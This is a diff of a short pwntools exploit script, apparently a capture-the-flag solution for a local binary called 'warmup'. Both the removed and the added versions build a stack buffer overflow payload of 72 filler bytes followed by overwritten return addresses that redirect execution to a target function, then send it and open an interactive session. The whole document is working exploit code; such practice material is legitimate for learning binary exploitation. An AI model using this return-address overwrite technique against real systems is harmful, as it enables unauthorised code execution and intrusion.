@@ -1,14 +1,9 @@
 from pwn import *
-
-target = process('./warmup')
-#gdb.attach(target, gdbscript = 'b *0x4006a3')
-
-# Make the payload
-payload = b""
-payload += b"0"*0x48 # Overflow the buffer up to the return address
-payload += p64(0x40060d) # Overwrite the return address with the address of the `easy` function
-
-# Send the payload
-target.sendline(payload)
-
-target.interactive()
+pay = b""
+pay += b"A" * 72
+pay += p64(0x04004a1)
+pay += p64(0x40060d)
+p = process("./warmup")
+p.recvuntil(b">")
+p.sendline(pay)
+p.interactive()
